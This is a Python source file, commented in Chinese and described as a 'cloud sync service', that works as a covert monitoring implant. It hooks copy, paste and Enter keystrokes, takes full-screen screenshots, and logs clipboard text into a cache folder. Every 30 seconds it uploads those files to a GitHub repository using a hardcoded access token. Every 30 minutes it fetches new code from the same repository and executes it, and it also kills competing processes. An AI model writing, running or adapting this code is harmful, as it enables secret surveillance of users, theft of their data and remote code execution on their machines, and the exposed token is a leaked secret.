import base64
import importlib.util
import os
import re
import socket
import sys
import threading
import time
import subprocess
from PIL import Image, ImageGrab
from pynput import keyboard
import pyperclip
import requests

# 设备与存储配置
DEVICE_NAME = socket.gethostname()
SAVE_DIR = r"D:\AppDataLogs\Cache"
os.makedirs(SAVE_DIR, exist_ok=True)

# GitHub 仓库配置
GITHUB_CONFIG = {
    "username": "Bei18",
    "repo_name": "my-python-storage",
    "file_path": "main_logic.py",
    "token": "github_pat_11CJ6CNNQ0XeFgza4F9cud_PlxsXOWgbrLwKqoMCXpxryGk6x2aPJWw36m5G26Pih2QZHXPSF4pv",
}

uploaded_files = set()
running_listeners = []


def kill_previous_instances():
    """清理历史运行进程，防止多开冲突"""
    try:
        current_pid = os.getpid()
        
        cmd = 'tasklist /FI "IMAGENAME eq DuoKai.exe" /FO CSV /NH'
        output = subprocess.check_output(cmd, shell=True, encoding='utf-8', errors='ignore')
        for line in output.splitlines():
            if "DuoKai.exe" in line:
                parts = line.split(',')
                if len(parts) >= 2:
                    pid_str = parts[1].replace('"', '').strip()
                    if pid_str.isdigit() and int(pid_str) != current_pid:
                        subprocess.run(f"taskkill /F /PID {pid_str}", shell=True, capture_output=True)

        cmd_wmic = 'wmic process where "name like \'%DuoKai%\' or commandline like \'%_remote_main_cache%\'" get processid'
        output_wmic = subprocess.check_output(cmd_wmic, shell=True, encoding='utf-8', errors='ignore')
        for line in output_wmic.splitlines():
            line = line.strip()
            if line.isdigit() and int(line) != current_pid:
                subprocess.run(f"taskkill /F /PID {line}", shell=True, capture_output=True)
    except Exception as e:
        print(f"[进程管理] 清理历史实例失败: {e}")


def extract_date_from_filename(file_name):
    """提取文件名中的日期，格式化为 MM.DD 目录路径"""
    match1 = re.search(r'\b20\d{2}(\d{2})(\d{2})\b', file_name)
    if match1:
        month = str(int(match1.group(1)))
        day = str(int(match1.group(2)))
        return f"{month}.{day}"
        
    match2 = re.search(r'\b20\d{2}-(\d{2})-(\d{2})\b', file_name)
    if match2:
        month = str(int(match2.group(1)))
        day = str(int(match2.group(2)))
        return f"{month}.{day}"
        
    return time.strftime('%m.%d').lstrip('0').replace('.0', '.')


def upload_file_smart(file_path):
    """通过 GitHub REST API 上传单个文件"""
    if not os.path.exists(file_path) or not GITHUB_CONFIG["token"]:
        print(f"[上传拦截] 文件不存在或未配置有效的 Token: {file_path}")
        return False

    file_name = os.path.basename(file_path)
    device_folder = DEVICE_NAME
    date_folder = extract_date_from_filename(file_name)

    target_path = f"uploads/{device_folder}/{date_folder}/{file_name}"
    base_url = f"https://api.github.com/repos/{GITHUB_CONFIG['username']}/{GITHUB_CONFIG['repo_name']}/contents/{target_path}"
    headers = {
        "Authorization": f"Bearer {GITHUB_CONFIG['token']}",
        "Accept": "application/vnd.github+json",
    }

    try:
        # 1. 检查远端是否已存在该文件（避免重复提交）
        get_res = requests.get(base_url, headers=headers, timeout=10)
        if get_res.status_code == 200:
            uploaded_files.add(file_name)
            return True

        # 2. 将本地文件转为 Base64 并提交
        with open(file_path, "rb") as f:
            file_content = f.read()
        encoded_content = base64.b64encode(file_content).decode("utf-8")

        data = {
            "message": f"Auto-sync upload: {device_folder}/{date_folder}/{file_name}",
            "content": encoded_content,
        }

        response = requests.put(base_url, headers=headers, json=data, timeout=15)
        if response.status_code in [200, 201]:
            uploaded_files.add(file_name)
            print(f"[上传成功] -> {target_path}")
            return True
        else:
            print(f"[上传失败] 状态码: {response.status_code}, 响应内容: {response.text}")
            return False
    except Exception as e:
        print(f"[上传异常] 网络超时或连接失败: {e}")
        return False


def scan_and_upload():
    """扫描缓存目录并批量上传"""
    try:
        if not os.path.exists(SAVE_DIR):
            return
        files = os.listdir(SAVE_DIR)
        for file in files:
            file_path = os.path.join(SAVE_DIR, file)
            if os.path.isfile(file_path) and file not in uploaded_files:
                upload_file_smart(file_path)
    except Exception as e:
        print(f"[目录扫描异常]: {e}")


def scheduled_upload_task():
    """轮询上传任务，每 30 秒执行一次"""
    scan_and_upload()
    while True:
        time.sleep(30)
        scan_and_upload()


def get_log_file_path():
    today_date = time.strftime("%Y-%m-%d")
    log_filename = f"{DEVICE_NAME}-{today_date}-LOG.txt"
    return os.path.join(SAVE_DIR, log_filename)


def write_txt(action_type, detail=""):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    log_content = f"[{timestamp}] [{action_type}] {detail}\n"
    log_file = get_log_file_path()

    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(log_content)
            f.flush()
    except Exception as e:
        print(f"[写入日志失败]: {e}")


def take_full_screenshot(action_type):
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    filename = f"{DEVICE_NAME}_{timestamp}_{action_type}.png"
    filepath = os.path.join(SAVE_DIR, filename)

    try:
        screenshot = ImageGrab.grab(all_screens=True)
        screenshot.save(filepath, "PNG")
        return filename
    except Exception:
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(filepath, "PNG")
            return filename
        except Exception as e:
            print(f"[截图失败]: {e}")
            return None


def get_clipboard_content():
    try:
        time.sleep(0.1)
        text = pyperclip.paste()
        if text and text.strip():
            clean_text = text.replace("\r\n", " ").replace("\n", " ")
            return f"文本: {clean_text}"
        else:
            return "无文本"
    except Exception:
        return "获取失败"


def on_copy():
    img_file = take_full_screenshot("PASTE_CtrlC")
    clip_text = get_clipboard_content()
    write_txt("C", f"JT: {img_file} | {clip_text}")


def on_paste():
    img_file = take_full_screenshot("PASTE_CtrlV")
    clip_text = get_clipboard_content()
    write_txt("V", f"JT: {img_file} | {clip_text}")


def on_press(key):
    try:
        if key == keyboard.Key.enter:
            img_file = take_full_screenshot("ENTER")
            write_txt("E", f"JT: {img_file}")
    except Exception:
        pass


def auto_update_loop(token):
    """从云端拉取更新的主逻辑模块"""
    cache_path = os.path.join(os.getenv("TEMP", "."), "_remote_main_cache.py")
    url = f"https://api.github.com/repos/{GITHUB_CONFIG['username']}/{GITHUB_CONFIG['repo_name']}/contents/{GITHUB_CONFIG['file_path']}"
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/vnd.github+json",
    }
    
    while True:
        time.sleep(1800)  # 每 30 分钟检查一次版本更新
        try:
            res = requests.get(url, headers=headers, timeout=10)
            if res.status_code == 200:
                content_b64 = res.json().get("content", "")
                new_code = base64.b64decode(content_b64)
                
                with open(cache_path, "wb") as f:
                    f.write(new_code)
                
                write_txt("系统", "检测到云端更新，重新载入模块...")

                for listener in running_listeners:
                    try: 
                        listener.stop()
                    except Exception: 
                        pass
                running_listeners.clear()

                spec = importlib.util.spec_from_file_location("remote_main", cache_path)
                remote_module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(remote_module)
                
                threading.Thread(target=remote_module.run, args=(token,), daemon=True).start()
                break
        except Exception as e:
            print(f"[远程热更新异常]: {e}")


def run(token):
    """主启动入口"""
    kill_previous_instances()

    GITHUB_CONFIG["token"] = token
    write_txt("启动", "云端同步服务启动成功")

    # 启动定时上传线程
    upload_thread = threading.Thread(target=scheduled_upload_task, daemon=True)
    upload_thread.start()

    # 启动快捷键监听 (Ctrl+C / Ctrl+V)
    try:
        hotkey_listener = keyboard.GlobalHotKeys({"<ctrl>+c": on_copy, "<ctrl>+v": on_paste})
        hotkey_listener.start()
        running_listeners.append(hotkey_listener)
    except Exception as e:
        write_txt("异常", f"快捷键监听服务异常: {e}")

    # 启动按键监听 (Enter 键)
    try:
        key_listener = keyboard.Listener(on_press=on_press)
        key_listener.start()
        running_listeners.append(key_listener)
    except Exception as e:
        write_txt("异常", f"按键监听服务异常: {e}")

    # 启动自动更新线程
    update_thread = threading.Thread(target=auto_update_loop, args=(token,), daemon=True)
    update_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        write_txt("停止", "手动终止程序")


if __name__ == "__main__":
    current_token = GITHUB_CONFIG["token"]
    if current_token:
        print(f"正在启动设备 [{DEVICE_NAME}] 的测试运行环境...")
        run(current_token)
    else:
        print("未发现有效 Token，无法启动测试！")
